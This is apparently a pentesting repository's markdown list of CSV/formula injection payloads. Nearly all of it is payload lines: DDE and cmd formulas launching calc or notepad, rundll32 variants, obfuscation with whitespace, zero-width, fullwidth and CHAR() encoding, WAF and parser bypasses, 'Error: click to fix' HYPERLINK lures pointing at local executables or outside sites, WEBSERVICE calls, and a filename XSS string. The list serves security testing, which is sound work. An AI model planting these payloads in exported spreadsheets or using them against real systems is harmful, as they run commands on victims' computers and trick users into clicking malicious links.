# CSV Injection Payload Collection

This is a curated list of CSV injection payloads used during security testing. The list includes basic to advanced variations, obfuscation tricks, and bypass techniques for different scenarios including formula injection, DDE attacks, and file path abuse.

---

## 🧪 Basic Payloads

```csv
=rundll32|'URL.dll,OpenURL calc'!A
-1-rundll32|'URL.dll,OpenURL calc'!A
=rundll32|'URL.dll,OpenURL notepad'!A
=rundll32|'URL.dll,OpenURL https://google.com'!A1
@SUM(1+1)*cmd|' /C calc'!A0
=cmd|'/C calc'!A1@example.com
=2+5+cmd|' /C calc'!A0
+hack(cmd|'/c calc.exe'!A
=hack/cmd|'/c calc.exe'!A
-2+3+cmd|'/C calc'!A1
-1-cmd|'/C calc'!'A1'
--1-cmd|'/C calc'!'A1'
=cmd|'/C notepad'!'A1'
=cmd|'/C calc'!'A2'
=cmd|'/C mspaint'!'A2'
=    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A
```

---

## 🧾 Older Excel Versions

```csv
DDE("cmd";"/C calc";"!A0")A0 
=EXEC("calc.exe")
```

---

## 🛠 rundll32 DLL Variants

```csv
=rundll32|'shell32.dll,ShellExec_RunDLL calc'!A1
=rundll32|'zipfldr.dll,RouteTheCall calc'!A1
=rundll32|'shell32.dll,Control_RunDLL timedate.cpl'!A1
=rundll32|'shell32.dll,Control_RunDLL appwiz.cpl'!A1
```

---

## 🌀 Abnormal Variations

```csv
=cmd|'/c calc'!'a2',
\t=\tc\tm\td\t|'/C notepad'!'A2',
=\ncmd|'/C calc'!A1
"=cmd|'/C calc'!'A1'"
```

---

## 🧩 Parse Breakers & Bypasses

### 🔹 Short Format Bypass

```csv
parsebreaker" ;,=cmd|'/C notepad'!'A1'
parsebreaker",=cmd|'/C notepad'!'A1''" ;,=cmd|'/C notepad'!'A2'
```

### 🔹 Polyglot / WAF Bypass

```csv
=cmd|'/C notepad'!'A1';0x09=cmd|'/C notepad'!'A2',0x0D=cmd|'/C notepad'!'A3';=cmd|'/C notepad'!'A4'=cmd|'/C notepad'!'A5''" ;,=cmd|'/C notepad'!'A6'
=cmd|'/C notepad'!'A0';=cmd|'/C notepad'!'A1';0x09=cmd|'/C notepad'!'A2';-1-cmd|'/C notepad'!'A3';0x0D-1-cmd|'/C notepad'!'A4';=cmd|'/C notepad'!'A5'=cmd|'/C notepad'!'A6''" ;,=cmd|'/C notepad'!'A7'
=cmd|'/C notepad'!'A1';0x09=cmd|'/C notepad'!'A2',\---1-cmd|'/C notepad'!'A3';@cmd|'/C notepad'!'A4'+cmd|'/C notepad'!'A5''" ;,=cmd|'/C notepad'!'A6'
```

---

## 📛 Escaped or Newline Payloads

```csv
\---1-cmd|'/C calc'!'A1'
\t--1-cmd|'/C calc'!'A1'
\"--1-cmd|'/C calc'!'A1'
\n--4-cmd|'/C calc'!'A1'
\r=cmd|' /C calc'!A1
\0=cmd|' /C calc'!A1
\r\",;=cmd|' /C calc'!A1
```

---

## 🧼 Zero-Width Marker Obfuscation

```csv
\u200B=cmd|' /C calc'!A0
\u00A0=cmd|' /C calc'!A1
\u200B=cmd|' /C calc'!A1
```

---

## ☣️ Dangerous Without Formula

These values can trigger execution by just clicking the cell:

```csv
file:///C:/Windows/System32/calc.exe
```

---

## 🚫 If Pipe (`|`), `cmd`, or Slash (`/`) Are Blocked

```csv
+HYPERLINK("file:///C:/Windows/System32/notepad.exe")
+HYPERLINK(CHAR(34)&file:///C:/Windows/System32/notepad.exe&CHAR(34))
@HYPERLINK(CHAR(34)&"file:///C:/Windows/System32/notepad.exe"&CHAR(34))
=HYPERLINK(T("file:///C:/Windows/System32/cmd.exe"), "ClickMe")
@HYPERLINK(\"file:///C:/Windows/System32/notepad.exe\")
@HYPERLINK(""file:///C:/Windows/System32/notepad.exe"")
=HYPERLINK("http://google.com", "Error: click to fix")
=HYPERLINK("https://google-web-pen-testing.vercel.app/", "Error: click to fix")
+HYPERLINK(\"http:\"&CHAR(47)&CHAR(47)&\"bing.com\"&CHAR(47)&\"payload\")
=WEBSERVICE("http://google.com")
=WEBSERVICE("https://google-web-pen-testing.vercel.app/")
=WEBSERVICE("http://bing.com")
```

---

## 🔢 CHAR() Obfuscation Variants

```csv
@HYPERLINK(CHAR(102)&CHAR(105)&CHAR(108)&CHAR(101)&CHAR(58)&CHAR(47)&CHAR(47)&CHAR(67)&CHAR(58)&CHAR(47)&CHAR(87)&CHAR(105)&CHAR(110)&CHAR(100)&CHAR(111)&CHAR(119)&CHAR(115)&CHAR(47)&CHAR(83)&CHAR(121)&CHAR(115)&CHAR(116)&CHAR(101)&CHAR(109)&CHAR(51)&CHAR(50)&CHAR(47)&CHAR(110)&CHAR(111)&CHAR(116)&CHAR(101)&CHAR(112)&CHAR(97)&CHAR(100)&CHAR(46)&CHAR(101)&CHAR(120)&CHAR(101))

@HYPERLINK("file:///C:/Windows/"&CHAR(83)&"ystem32/cmd.exe")

@HYPERLINK("file:///C:"&CHAR(47)&"Windows"&CHAR(47)&"System32"&CHAR(47)&"cmd.exe")

@WEBSERVICE(CHAR(104)&CHAR(116)&CHAR(116)&CHAR(112)&CHAR(115)&CHAR(58)&CHAR(47)&CHAR(47)&CHAR(119)&CHAR(119)&CHAR(119)&CHAR(46)&CHAR(103)&CHAR(111)&CHAR(111)&CHAR(103)&CHAR(108)&CHAR(101)&CHAR(46)&CHAR(99)&CHAR(111)&CHAR(109))
```

### chained payload
```csv
=HYPERLINK(CONCAT(CHAR(102),CHAR(105),CHAR(108),CHAR(101),CHAR(58),CHAR(47),CHAR(47),CHAR(47),CHAR(67),CHAR(58),CHAR(47),CHAR(87),CHAR(105),CHAR(110),CHAR(100),CHAR(111),CHAR(119),CHAR(115),CHAR(47),CHAR(83),CHAR(121),CHAR(115),CHAR(116),CHAR(101),CHAR(109),CHAR(51),CHAR(50),CHAR(47),CHAR(99),CHAR(109),CHAR(100),CHAR(46),CHAR(101),CHAR(120),CHAR(101)),"Open Command Prompt")
=T(CHAR(102)&CHAR(105)&CHAR(108)&CHAR(101)&CHAR(58)&CHAR(47)&CHAR(47)&CHAR(47)&CHAR(67)&CHAR(58)&CHAR(47)&CHAR(87)&CHAR(105)&CHAR(110)&CHAR(100)&CHAR(111)&CHAR(119)&CHAR(115)&CHAR(47)&CHAR(83)&CHAR(121)&CHAR(115)&CHAR(116)&CHAR(101)&CHAR(109)&CHAR(51)&CHAR(50)&CHAR(47)&CHAR(99)&CHAR(109)&CHAR(100)&CHAR(46)&CHAR(101)&CHAR(120)&CHAR(101))

=HYPERLINK(G2,"Click Me")
```

#### example of a multi chained csv on multiple cells
![csvi-chained-example](https://github.com/thiem-dev/xssCat/blob/main/MyPayloadAll/images-examples/chained-csvi-example.png?raw=true)

---

## 🧠 File Name Exploits

```csv
=HYPERLINK("google.com", "Error: click to fix") .csv
@SUM(1+1)+cmd|' C calc'!A0.jpg
"; alert('XSS');//.jpg
```

---

## 🌐 Unicode / Encoding Bypass

```csv
＝cmd|/C calc!A1
+cmd|/C calc!A1
\xEF\xBB\xBF\t=cmd|'/C calc'!A0
“＝cmd|'/C calc'!A0”
cmd|'/C calc'!A0,?
```

---

## 🧪 Payloads That Break Excel Logic

```csv
1e3
1e4
+1E+9
-123456
```

---

## 📚 Resources

- [HackTricks: CSV/Excel Injection](https://book.hacktricks.xyz/pentesting-web/formula-csv-doc-latex-ghostscript-injection)

---

